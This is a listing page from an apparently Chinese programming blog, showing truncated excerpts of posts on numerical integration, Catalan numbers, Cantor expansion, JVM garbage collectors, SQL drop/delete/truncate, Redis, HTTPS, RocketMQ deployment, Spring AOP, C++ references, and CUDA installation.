他的本质就是把函数看作一个二次函数，如果区间够小，那么函数就足够近似，我们可以直接按照二次函数来计算每个小段的积分。
推导其实就是最基本的积分过程
​ ∫ a b f ( x ) d x = ∫ a b ( A x 2 + B x + C ) d x \int_{a}^{b} f(x) dx=\int_{a}^{b}(Ax^2+Bx+C)dx ∫ab​f(x)dx=∫ab​(Ax2+Bx+C)dx
= A 3 ( b 3 − a 3 ) + B 2 ( b 2 − a 2 ) + C ( b − a ) =\frac{A}{3}(b^3-a^3)+\frac{B}{2}(b^2-a^2)+C(b-a) =3A​(b3−a3)+2B​(b2−a2)+C(b−a)
= 2 A ( b 3 − a 3 ) + 3 B ( b 2 − a 2 ) + 6 C ( b − a ) 6 =\frac{2A(b^3-a^3)+3B(b^2-a^2)+6C(b-a)}{6} =62A(b3−a3)+3B(b2−a2)+6C(b−a)​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c588831ac5586eb74f9bc086979770c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c29a2b5901eeb51f216dff5e770b18e/" rel="bookmark">
			一些常见的数列问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一些常见的数列问题 卡特兰数 卡特兰数本质就是组合数学中经常出现在计数问题中的数列。他的本质其实是表达一类关系。但是在实际应用中，其实我们还是更关心他的实际价值。也就是他的值和那些问题的本质是相同的，那么我们可以通过求解卡特兰数，简介求解原问题本身。本身也是比较模板的一类问题
下面列出主要的应用场景。
1.合法路径问题，在一个网格中，从（0，0）走到（n，n）的合法方案总数。
2.你现在有n个0和n个1，问有多少个长度为2n的序列，使得序列的任意一个前缀中1的个数都大于等于0的个数，问有多少合法序列
3.你有n个左括号，n个右括号，问有多少个长度为2n的括号序列使得所有的括号都是合法的
4.有一个栈，我们有2n次操作，n次进栈，n次出栈，问有多少中合法的进出栈序列
5.一个长度为n的排列a，只要满足i&lt;j&lt;k且aj&lt;ak&lt;ai就称这个排列为312排列，求n的全排列中不是312排列的排列个数（他的本质就是1，2，。。。依次进栈，312数列就代表不可法的进出站序列）
6.在一个圆周上分布着 2n个点，两两配对，并在这两个点之间连一条弦，要求所得的2n条弦彼此不相交的配对方案数
7.有n个点，问用这n个点最终能构成多少二叉树
8.一个凸的n边形，用直线连接他的两个顶点使之分成多个三角形，每条直线不能相交，问一共有多少种划分方案
本质上这些问题的数学意义一般都和卡特兰数量的某种表达方式类似，所以才相等，实际问题中，我们也可以尝试思考，观察问题和卡特兰数列意义上的关系，或者思考新问题和上述经典模型是否相似。
实际问题中，我们求解卡特兰数的方法一般是直接组合数求解 f n = C 2 n n − C 2 n n − 1 f_n=C_{2n}^{n}−C_{2n}^{n-1} fn​=C2nn​−C2nn−1​
默慈金数 这里先给出百度百科中的定义
默慈金数是在数学中，一个给定的数n的默慈金数是“在一个圆上的n个点间，画出彼此不相交的弦的全部方法的总数”。
他也是一个数列（OEIS中的数列A001006）表达了某种数学意义。
关于他的递推公式可以看这篇论文详细了解，Motzkin Number（默慈金数） - 豆丁网 (docin.com)
Motzkin Number – from Wolfram MathWorld
这里直接给出他的递推形式 f n = ( 2 n + 1 ) f n − 1 + ( 3 n − 3 ) f n − 2 n + 2 f_n=\frac{(2n+1)f_{n-1}+(3n-3)f_{n-2}}{n+2} fn​=n+2(2n+1)fn−1​+(3n−3)fn−2​​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c29a2b5901eeb51f216dff5e770b18e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13ee43f8852083c8458baaa74a10c8c2/" rel="bookmark">
			康托展开和逆康托
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		康托展开 康托展开是一个全排列到一个自然数的双射，常用于构建hash表时的空间压缩。设有n个数(1,2,3,4,…,n) ，可以有组成不同(n!种)的排列组合，康托展开表示的就是是当前排列组合在n个不同元素的全排列中的名次。也就是说，康托展开可以用来求一个 的任意排列的排名。
他的具体原理也不复杂，不过没啥用，不浪费时间展开说明，感兴趣百度有很多优秀的解释。
这里直接给出他的模板代码。暴力O（n^2),树状数组优化可以做到O（nlogn）.但是求排列，一般n不会很大。
所以大部分情况暴力就能解决问题。
#include&lt;bits/stdc++.h&gt; using namespace std; using ll=long long; ll fact[1010],P[1010],A[1010],tree[1010];//P是排列数组，fact是阶乘，自己初始化 ll lowbit(ll x) { return x&amp;-x; } ll query(ll x) { ll ans = 0; for (int i = x; i &gt;= 1; i -= lowbit(i)) ans += tree[i]; return ans; } void update(ll x, ll d) { for (int i = x; i &lt;1010; i += lowbit(i)) tree[i] += d; } ll cantor(int P[], int n) { ll ans = 1; for (int i = n; i &gt;= 1; i--) { A[i] = query(P[i]); update(P[i], 1); } for (int i = 1; i &lt; n; i++) ans = (ans + A[i] * fact[n - i]) % MOD; return ans; } int main() { cin.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13ee43f8852083c8458baaa74a10c8c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52d8021afac3e31ae37e9b4cea86741a/" rel="bookmark">
			谷粒商城项目学-分布式基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目框架图 分布式基础概念 • 微服务、注册中心、配置中心、远程调用、Feign、网关
• 2、基础开发
• SpringBoot2.0、SpringCloud、Mybatis-Plus、Vue组件化、阿里云对象存储
• 3、环境
• Vagrant、Linux、Docker、MySQL、Redis、逆向工程&amp;人人开源
• 4、开发规范
• 数据校验JSR303、全局异常处理、全局统一返回、全局跨域处理
• 枚举状态、业务状态码、VO与TO与PO划分、逻辑删除
• Lombok：@Data、@Slf4j
前情提要 本项目全部都采用了最新配置，和视频版本不一样。报错改了好久。
技巧 将一个实体的值复制到另一个实体，不需要单独一个个get,set了
BeanUtils.copyProperties(attr,attrEntity);
大数据情况下不建议联表查询，笛卡尔积，应分开查询
日期格式化 统一设置
spring
jackson:
date-format: yyyy-MM-dd HH:mm:ss
ge &gt;=
gt &gt;
le &lt;=
如果传过来的数据可能为空，用包装类
对于不重要查询失败错误，不要回滚事务，直接trycatch不进行处理
对于部分数据可能有取消原有信息的处理：直接先全部删除所有数据，再依次添加新数据，不用依次判断是否删除数据。
parentPath.toArray(new Long[0]);
区别(new Long[])parentPath.toArray()
循环查库
循环依赖
复杂的json网上可以直接生成java实体类 bejson.com
stream.map和ForEach区别
BigDecimal的比较
skuReductionTo.getFullPrice().compareTo(new BigDecimal(“0”)) == 1
排除数据源相关的配置
@SpringBootApplication(exclude = {DataSourceAutoConfiguration.class})
熟悉流式编程
过滤、排序、统计分组
多线程高效
Lambda 表达式中访问的局部变量不能为变量 Long purchaseId = mergeVo.getPurchaseId(); if(purchaseId == null){ //.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52d8021afac3e31ae37e9b4cea86741a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f44767aad38ebbb59f53664449b94b1d/" rel="bookmark">
			JAVA选择合适的垃圾收集器&#43;内存分配实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《深入理解Java虚拟机：JVM高级特性与最佳实践（第3版）》
目录
低延迟垃圾收集器
Shenandoah收集器
ZGC收集器
选择合适的垃圾收集器
Epsilon收集器
收集器的权衡
虚拟机及垃圾收集器日志
垃圾收集器参数总结 实战：内存分配与回收策略
对象优先在Eden分配
大对象直接进入老年代
长期存活的对象将进入老年代
动态对象年龄判定
空间分配担保
低延迟垃圾收集器 Shenandoah收集器 Shenandoah也是使用基于Region的堆内存布局，同样有着用于存放大对象的Humongous Region，默认的回收策略也同样是优先处理回收价值最大的Region……
但在管理堆内存方面，它与G1至少有三个明显的不同之处，最重要的当然是支持并发的整理算法，G1的回收阶段是可以多线程并行的，但却不能与用户线程并发。
其次，Shenandoah（目前）是默认不使用分代收集的，换言之，不会有专门的新生代Region或者老年代Region的存在，没有实现分代，并不是说分代对Shenandoah没有价值， 这更多是出于性价比的权衡，基于工作量上的考虑而将其放到优先级较低的位置上。
最后， Shenandoah摒弃了在G1中耗费大量内存和计算资源去维护的记忆集，改用名为“连接矩阵”（Connection Matrix）的全局数据结构来记录跨Region的引用关系，降低了处理跨代指针时的记忆集维护消耗，也降低了伪共享问题的发生概率。
连接矩阵可以简单理解为一张二维表格，如果Region N有对象指向Region M，就在表格的N行M列中打上一个标记。
如果Region 5中的对象Baz 引用了Region 3的Foo，Foo又引用了Region 1的Bar，那连接矩阵中的5行3列、3行1列就应该被打上标 记。在回收时通过这张表格就可以得出哪些Region之间产生了跨代引用。
Shenandoah收集器的工作过程大致可以划分为以下九个阶段
初始标记（Initial Marking）：与G1一样，首先标记与GC Roots直接关联的对象，这个阶段仍 是“Stop The World”的，但停顿时间与堆大小无关，只与GC Roots的数量相关。并发标记（Concurrent Marking）：与G1一样，遍历对象图，标记出全部可达的对象，这个阶段是与用户线程一起并发的，时间长短取决于堆中存活对象的数量以及对象图的结构复杂程度。最终标记（Final Marking）：与G1一样，处理剩余的SATB扫描，并在这个阶段统计出回收价值最高的Region，将这些Region构成一组回收集（Collection Set）。最终标记阶段也会有一小段短暂的停顿。并发清理（Concurrent Cleanup）：这个阶段用于清理那些整个区域内连一个存活对象都没有找到的Region（这类Region被称为Immediate Garbage Region）。并发回收（Concurrent Evacuation）：并发回收阶段是Shenandoah与之前HotSpot中其他收集器的核心差异。 在这个阶段，Shenandoah要把回收集里面的存活对象先复制一份到其他未被使用的Region之中。复制对象这件事情如果将用户线程冻结起来再做那是相当简单的，但如果两者必须要同时并发进行的话，就变得复杂起来了。其困难点是在移动对象的同时，用户线程仍然可能不停对被移动的对象进行读写访问，移动对象是一次性的行为，但移动之后整个内存中所有指向该对象的引用都还是旧对象的地址，这是很难一瞬间全部改变过来的。对于并发回收阶段遇到的这些困难，Shenandoah将会通过读屏障和被称为“Brooks Pointers”的转发指针来解决。并发回收阶段运行的时间长短取决于回收集的大小。初始引用更新（Initial Update Reference）：并发回收阶段复制对象结束后，还需要把堆中所有指向旧对象的引用修正到复制后的新地址，这个操作称为引用更新。 引用更新的初始化阶段实际上并未做什么具体的处理，设立这个阶段只是为了建立一个线程集合点，确保所有并发回收阶段中进行的收集器线程都已完成分配给它们的对象移动任务而已。初始引用更新时间很短，会产生一个非常短暂的停顿。并发引用更新（Concurrent Update Reference）：真正开始进行引用更新操作，这个阶段是与用户线程一起并发的，时间长短取决于内存中涉及的引用数量的多少。 并发引用更新与并发标记不同，它不再需要沿着对象图来搜索，只需要按照内存物理地址的顺序，线性地搜索出引用类型，把旧值改为新值即可。最终引用更新（Final Update Reference）：解决了堆中的引用更新后，还要修正存在于GC Roots 中的引用。这个阶段是Shenandoah的最后一次停顿，停顿时间只与GC Roots的数量相关。并发清理（Concurrent Cleanup）：经过并发回收和引用更新之后，整个回收集中所有的Region已再无存活对象，这些Region都变成Immediate Garbage Regions了，最后再调用一次并发清理过程来回收这些Region的内存空间，供以后新对象分配使用。 Shenandoah收集器的工作过程 并发回收——转发指针： 此前，要做类似的并发操作，通常是在被移动对象原有的内存上设置保护陷阱（Memory Protection Trap），一旦用户程序访问到归属于旧对象的内存空间就会产生自陷中断，进入预设好的异常处理器中，再由其中的代码逻辑把访问转发到复制后的新对象上。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f44767aad38ebbb59f53664449b94b1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2629e04514478d7f372764ed753ecf32/" rel="bookmark">
			电路设计之电压采样低功耗设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69b7651f2a4e93bff6adbd4742f925c5/" rel="bookmark">
			drop,delete与truncate的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		drop,delete与truncate的区别 1、drop (删除表)：删除内容和定义，释放空间。简单来说就是把整个表去掉.以后要新增数据是不可能的,除非新增一个表。
drop语句将删除表的结构被依赖的约束（constrain),触发器（trigger)索引（index);依赖于该表的存储过程/函数将被保留，但其状态会变为：invalid。
2、truncate (清空表中的数据)：删除内容、释放空间但不删除定义(保留表的数据结构)。与drop不同的是,只是清空表数据而已。
注意:truncate 不能删除行数据,要删就要把表清空。
3、delete (删除表中的数据)：delete 语句用于删除表中的行。delete语句执行删除的过程是每次从表中删除一行，并且同时将该行的删除操作作为事务记录在日志中保存
以便进行进行回滚操作。
truncate与不带where的delete ：只删除数据，而不删除表的结构（定义）
4、truncate table 删除表中的所有行，但表结构及其列、约束、索引等保持不变。新行标识所用的计数值重置为该列的种子。如果想保留标识计数值，请改用delete。
如果要删除表定义及其数据，请使用 drop table 语句。
5、对于由foreign key约束引用的表，不能使用truncate table ，而应使用不带where子句的delete语句。由于truncate table 记录在日志中，所以它不能激活触发器。
6、执行速度，一般来说: drop&gt; truncate &gt; delete。
7、delete语句是数据库操作语言(dml)，这个操作会放到 rollback segement 中，事务提交之后才生效；如果有相应的 trigger，执行的时候将被触发。
​ truncate、drop 是数据库定义语言(ddl)，操作立即生效，原数据不放到 rollback segment 中，不能回滚，操作不触发 trigger。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b46e9b96e2623b25ebc2fe54130770db/" rel="bookmark">
			Redis数据类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis数据类型 string 介绍：数据结构是简单的 key-value 类型，value可高达512MB的数据。虽然 Redis 是用 C 语言写的，但是 Redis 并没有使用 C 的字符串表示，而是自己构建了一种 简单动态字符串（simple dynamic string，SDS）。相比于 C 的原生字符串，Redis 的 SDS 不光可以保存文本数据还可以保存二进制数据，并且获取字符串长度复杂度为 O(1)（C 字符串为 O(N)）,除此之外,Redis 的 SDS API 是安全的，不会造成缓冲区溢出。常用命令：set,get,strlen,exists,dect,incr,setex 等等。**应用场景：**一般常用在需要计数的场景，比如用户的访问次数、热点文章的点赞转发数量等等。 下面我们简单看看它的使用！
普通字符串的基本操作：
127.0.0.1:6379&gt; set key value #设置 key-value 类型的值 OK 127.0.0.1:6379&gt; get key # 根据 key 获得对应的 value "value" 127.0.0.1:6379&gt; exists key # 判断某个 key 是否存在 (integer) 1 127.0.0.1:6379&gt; strlen key # 返回 key 所储存的字符串值的长度。 (integer) 5 127.0.0.1:6379&gt; del key # 删除某个 key 对应的值 (integer) 1 127.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b46e9b96e2623b25ebc2fe54130770db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7947038ef5a1e7de652158bebc62fdb8/" rel="bookmark">
			HTTPS总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTPS 从网络协议的角度理解HTTPS： HTTPS 经由 HTTP 进行通信，但利用 TLS 来保证安全，即 HTTPS = HTTP + TLS
从密码学的角度理解HTTPS HTTPS 使用 TLS 保证安全，这里的“安全”分两部分，一是传输内容加密、二是服务端的身份认证
TLS工作流程： 密码基础 伪随机数生成器 为什么叫伪随机数，因为没有真正意义上的随机数
它的主要作用在于生成对称密码的秘钥、用于公钥密码生成秘钥对
消息认证码 消息认证码主要用于验证消息的完整性与消息的认证，其中消息的认证指“消息来自正确的发送者”
发送者与接收者事先共享秘钥发送者根据发送消息计算 MAC 值发送者发送消息和 MAC 值接收者根据接收到的消息计算 MAC 值接收者根据自己计算的 MAC 值与收到的 MAC 对比如果对比成功，说明消息完整，并来自与正确的发送者 缺点：消息认证码的缺点在于无法防止否认，因为共享秘钥被 client、server 两端拥有，server 可以伪造 client 发送给自己的消息（自己给自己发送消息）
数字签名 数字签名和消息认证码都不是为了加密
使用自己的私钥对自己所认可的消息生成一个该消息专属的签名，这就是数字签名，表明我承认该消息来自自己
注意：私钥用于加签，公钥用于解签，每个人都可以解签，查看消息的归属人
公钥密码 公钥密码也叫非对称密码，由公钥和私钥组成，它是最开始是为了解决秘钥的配送传输安全问题，即，我们不配送私钥，只配送公钥，私钥由本人保管
它与数字签名相反，公钥密码的私钥用于解密、公钥用于加密，每个人都可以用别人的公钥加密，但只有对应的私钥才能解开密文
client：明文 + 公钥 = 密文
server：密文 + 私钥 = 明文
注意：公钥用于加密，私钥用于解密，只有私钥的归属者，才能查看消息的真正内容
证书 密码总结 密码作用组成消息认证码确认消息的完整、并对消息的来源认证共享秘钥+消息的散列值数字签名对消息的散列值签名公钥+私钥+消息的散列值公钥密码解决秘钥的配送问题公钥+私钥+消息证书解决公钥的归属问题公钥密码中的公钥+数字签名 HTTPS的一次请求流程 先建立一个tcp的连接
浏览器获取证书
浏览器验证证书-&gt;去ca验证,ca已经把根证书存到了我们的操作系统中
浏览器通过公钥加密一个对称密钥(一段数据),
服务器接收到密文,通过自己的私钥解密得到对称密钥
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7947038ef5a1e7de652158bebc62fdb8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de1967e91b7e1ae910f9807802408dc1/" rel="bookmark">
			DockerCompose部署rocketMQ
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近工作时用到了rocketMQ，并且测试服务器的rocketMQ总会出现问题，我找到运维的同事把测试服务器的账号要过来，准备自己部署一下rocketMQ，于是便有了这篇博客。
这篇博客参考了使用docker安装RocketMQ_皓亮君的博客-CSDN博客_docker rocketmq
并使用dockerCompose进行部署简化了操作的过程。
首先我们需要有dockerCompose的环境，这里不多介绍了，前面的博客已经写了太多安装的步骤了。
使用DockerCompose部署只需要准备两个文件，broker.conf和docker-compose.yml。
1、broker.conf
# 所属集群名称，如果节点较多可以配置多个 brokerClusterName = DefaultCluster #broker名称，master和slave使用相同的名称，表明他们的主从关系 brokerName = broker-a #0表示Master，大于0表示不同的slave brokerId = 0 #表示几点做消息删除动作，默认是凌晨4点 deleteWhen = 04 #在磁盘上保留消息的时长，单位是小时 fileReservedTime = 48 #有三个值：SYNC_MASTER，ASYNC_MASTER，SLAVE；同步和异步表示Master和Slave之间同步数据的机制； brokerRole = ASYNC_MASTER #刷盘策略，取值为：ASYNC_FLUSH，SYNC_FLUSH表示同步刷盘和异步刷盘；SYNC_FLUSH消息写入磁盘后才返回成功状态，ASYNC_FLUSH不需要； flushDiskType = ASYNC_FLUSH # 设置broker节点所在服务器的ip地址 brokerIP1 = 192.168.30.200 # 磁盘使用达到95%之后,生产者再写入消息会报错 CODE: 14 DESC: service not available now, maybe disk full diskMaxUsedSpaceRatio=95 此文件只需要修改一下ip即可
2、docker-compose.yml
version: "3.0" services: rocketmqNameServer: image: rocketmqinc/rocketmq container_name: rocketmqNameServer #restart: always volumes: #挂载路径，冒号左边为服务器本地路径，冒号右边为容器内部路径 - /home/ubuntu2004/rocketMQ/data/nameServer/logs:/root/logs - /home/ubuntu2004/rocketMQ/data/nameServer/store:/root/store environment: MAX_POSSIBLE_HEAP: 100000000 command: # 服务启动 sh mqnamesrv #network_mode: host ports: - "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de1967e91b7e1ae910f9807802408dc1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b89114c10ace933f9761d714ca171107/" rel="bookmark">
			AOP底层原理（代理）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、AOP概念 概念：面向切面编程（方面）利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。
通俗的说就是：不通过修改源代码方式，在主干功能里面添加新功能
AOP时ioc的一个新增的功能，是对Bean进行操作
另外补充两个概念：
OOP 面向对象编程
以对象为基本单位完成程序开发，通过对象间的相互协同，完成程序构建
POP 面向过程编程
以函数为基本单位完成程序开发，通过函数间的相互调用，完成程序构建
aop是ioc的一个扩展功能，先有的ioc，再有的aop,
只是在ioc的整个流程中新增的一个扩展点而已:BeanPostProcessor　总:
aop概念, 应用场景【记录日志，权限控制，缓存优化，监控方法运行时间】，动态代理　分　bean的创建过程中有一个步骤可以对bean进行扩展实现，aop本 身就是一个扩展功能，所以在BeanPostProcessor的后置处理方法中来进行实现
1. 代理对象的创建过程(advice，切面, 切点)
2、通过jdk或者cglib的方式来生成代理对象
3在执行方法调用的时候，会调用到生成的字节码文件中，直接# 时找到DynamicAdvisoredinterceptor类中的intercep方法，从此
方法开始执行
4根据之前定义好的通知来生成拦截器链
5.从拦截器链中依次获取每一个通知开始进行执行, 在执行过程中, 为了方便找到下一个通知是哪个，会有一个CglibMethodinvocation的对象， 找的时候是从-1的位置一次开始查找并且执行的。
二、AOP底层原理 1、使用JDK动态代理（基于接口的）
接口：
public interface StudentDao{ public int add(int a,int b); public String update(String id); } 实现类：
public class StudentDaoImpl implements StudentDao{ @Override public int add(int a, int b) { return a+b; } @Override public String update(String id) { return id; } } 代理类：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b89114c10ace933f9761d714ca171107/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ae39a9302a2855b2aa814aa18f46104/" rel="bookmark">
			安卓集成百度边缘计算框架EasyEdge实现OCR
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 下载SDK PP-OCR-tinyhttps://bj.bcebos.com/aipe-easyedge/open-model/82/EasyEdge-Android-PP-OCR-tiny-arm-SDK.zip?authorization=bce-auth-v1%2F50c8bb753dcb4e1d8646bb1ffefd3503%2F2022-10-15T11%3A47%3A31Z%2F3600%2F%2Fdf2ff4f7a8d72f629dc405af95769956f7b02da8d0427b786df59677035c6aef
或者自己选一个 开源模型
2 解压SDK +app 简单的设置，模拟用户的项目 |---+libs 实际使用时需要复制到自己的项目里 |----arm64-v8a v8a的so |----armeabi-v7a v7a的so |----easyedge-sdk.jar jar库文件 |---+src/main |---+assets |----demo demo项目的配置，实际集成不需要 |----infer 也可能是其它命名，infer表示通用arm。实际使用时可以复制到自己的项目里 |---+java/com.baidu.ai.edge/demo |---+infertest 通用Arm精简版测试，里面有SDK的集成逻辑 |--- MainActivity 通用Arm精简版启动Activity，会根据assets目录判断当前的模型类型，并运行同目录的一个Task。使用时需要修改里面的序列号 |--- TestInferClassifyTask 通用Arm精简版分类 |--- TestInferDetectionTask 通用Arm精简版检测 |--- TestInferOcrTask 通用Arm精简版OCR |--- TestInferPoseTask 通用Arm精简版姿态 |--- TestInferSegmentTask 通用Arm精简版分割 |---+snpetest SNPE精简版测试 |--- MainActivity SNPE精简版启动Activity，会根据assets目录判断当前的模型类型，并运行同目录的一个Task。使用时需要修改里面的序列号 |--- TestSnpeClassifyTask SNPE精简版分类 |--- TestSnpeDetectionTask SNPE精简版检测 |---+ddktest DDK精简版测试 |--- MainActivity DDK精简版启动Activity，会根据assets目录判断当前的模型类型，并运行同目录的一个Task。使用时需要修改里面的序列号 |--- TestDDKClassifyTask DDK精简版分类 |--- TestDDKDetectionTask DDK精简版检测 |---+davincitest Davinci精简版测试 |--- MainActivity Davinci精简版启动Activity，会根据assets目录判断当前的模型类型，并运行同目录的一个Task。使用时需要修改里面的序列号 |--- TestDavinciClassifyTask Davinci精简版分类 |--- TestDavinciDetectionTask Davinci精简版检测 |----CameraActivity 摄像头扫描示例，里面有SDK的集成逻辑 |----MainActivity 启动Activity，使用时需要修改里面的序列号 |---- build.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ae39a9302a2855b2aa814aa18f46104/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94b58c45e01ca0284c8deb17a1408fce/" rel="bookmark">
			C&#43;&#43;中引用和常量引用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、引用 在C++语言中，提供了一种为变量起一个别名的机制，这个别名就是引用。声明引用的过程也就是为某个变量建立别名的过程。
int main() { int a = 3; int&amp; b = a; b = 9; cout &lt;&lt; a &lt;&lt; " , " &lt;&lt; b; //输出结果为 9 ，9 } 引用作为别名，实现了对目标对象名字的绑定，因此必须使用目标对象的原始名字来初始化。C++引用变量相当于在使用时总是自动进行间接访问的指针常量，其实作用在引用上的操作只有初始化，后续的操作将全部作用在引用所指向的对象上。如下：
int main() { int a = 0; int&amp; b = a; b++; } 上面的b++并没有对引用本身做自增操作，++操作是作用到了int对象a上，所以一个引用的值在初始化后就不能改变了，它总是去引用它被初始化时所指向的那个对象。
C++引用的初始式必须是一个类型T的左值。
介绍一下左值和右值：
左值：能够获得某个不可移动对象的值或标识的表达式。如 i ，*p
右值：只能获取值，不能获取标识的表达式。如1，a+b
左值可以位于位于赋值语句的左边，但右值不能，右值只能位于右边，不能位于左边
二、常量引用 常量引用就是对const的引用的简称，它会把它所指向的对象作为常量，所以不可以通过该引用来修改它所指向的对象的值。指向常量对象时，必须要使用常量引用，而不能使用一般引用。常量引用可以指向一个非常量引用，但不允许用常量引用修改非常量对象的值。
int main() { const int a = 2; const int&amp; b = a;	//正确 int&amp; c = a;	//错误 int x = 3; const int&amp; y = x; y = 5;	//错误 } 与普通的变量不同，常量引用是非常特殊的程序对象，所绑定初始式既可以是左值，又可以是右值。如果初始式是右值，首先会将右值进行隐式类型的转换，并将结果存入到一个的临时变量中，然后会将此临时变量作为初始式。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94b58c45e01ca0284c8deb17a1408fce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d6409c48c4b143689f04422941d2f87/" rel="bookmark">
			LT-mapper,LT-removert代码运行与学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0.上一篇1.配置参数2.代码运行(1)Removert 主程序启动--Removert Main Started(2)开始自移除--Self-removing starts(3)识别出强/弱 负变化/正变化点进行比较： (4)更新扫描Scan 0.上一篇 LT-mapper，LT-SLAM代码运行与学习：添加链接描述
1.配置参数 参考下面修改xx/LT_mapper_ws/src/lt-mapper/ltremovert/config/params_ltmapper.yaml中的5处路径与pcd文件起始和终止索引
路径，由于01数据段时间在前，故将其作为中心段central，作为参考；将02数据段作为查询段query。
# 修改前 # save_pcd_directory: "/home/user/Desktop/ltslam-tutorial-kitti/data_ltmapper_mulran/riverside-rs/out/" # replace to your path (please use an absolute path) # 修改后 save_pcd_directory: "/media/meng/T7/dataset/LT_mapper/data_removert/0102/" ##hxz # 修改前---------------------- # central_sess_scan_dir: "/home/user/Desktop/ltslam-tutorial-kitti/data_scaloam_mulran/riverside/01/Scans/" # central_sess_pose_path: "/home/user/Desktop/ltslam-tutorial-kitti/data_ltslam_mulran/riverside0102rs/01_central_aft_intersession_loops.txt" # query_sess_scan_dir: "/home/user/Desktop/ltslam-tutorial-kitti/data_scaloam_mulran/riverside/02/Scans/" # query_sess_pose_path: "/home/user/Desktop/ltslam-tutorial-kitti/data_ltslam_mulran/riverside0102rs/02_central_aft_intersession_loops.txt" # 修改后------------- central_sess_scan_dir: "/media/meng/T7/dataset/LT_mapper/data_parsed/01/Scans/" ##hxz central_sess_pose_path: "/media/meng/T7/dataset/LT_mapper/data_parsed/01/01_central_aft_intersession_loops.txt" ##hxz query_sess_scan_dir: "/media/meng/T7/dataset/LT_mapper/data_parsed/02/Scans/" ##hxz query_sess_pose_path: "/media/meng/T7/dataset/LT_mapper/data_parsed/02/02_central_aft_intersession_loops.txt" ##hxz pcd文件索引,注意这这个索引不要超过/media/meng/T7/dataset/LT_mapper/data_parsed/01/Scans/和/media/meng/T7/dataset/LT_mapper/data_parsed/02/Scans/里面文件的索引，否则会报错。
# start_idx: 1100 # change this // for 0103 # end_idx: 1200 # change this // for 0103 start_idx: 100 # change this // for 0103 //hxz end_idx: 200 # change this // for 0103 //hxz 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d6409c48c4b143689f04422941d2f87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dd1bc52ba337b42f5403db5496d1baa/" rel="bookmark">
			linux CUDA安装（非ROOT用户）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、背景
跑一个18年Tensorflow的项目（中文、闽南语语音合成），报错ImportError: libcublas.so.9.0: cannot open shared object file: No such file，查询后，原因是CUDA版本不匹配导致，详见，于是安装CUDA9.0。
二、安装CUDA 9.0
CUDA（Compute Unified Device Architecture），是显卡厂商NVIDIA推出的运算平台。 CUDA™是一种由NVIDIA推出的通用并行计算架构，该架构使GPU能够解决复杂的计算问题。
下载地址：CUDA Toolkit Archive | NVIDIA Developer找到9.0下载，下载后是cuda_9.0.176_384.81_linux.run，然后sh cuda_9.0.176_384.81_linux.run命令进行安装。
